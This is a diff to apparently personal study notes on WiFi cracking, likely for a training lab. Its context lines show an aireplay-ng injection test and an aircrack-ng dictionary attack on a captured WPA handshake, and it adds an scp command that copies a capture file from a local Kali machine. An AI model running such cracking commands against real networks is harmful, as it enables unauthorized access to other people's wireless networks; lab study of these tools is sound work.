@@ -43,3 +43,9 @@ sudo aireplay-ng -9 wlan0mon
 ```
 aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
 ```
+
+
+##Useful Linux Commands
+```
+scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
+```
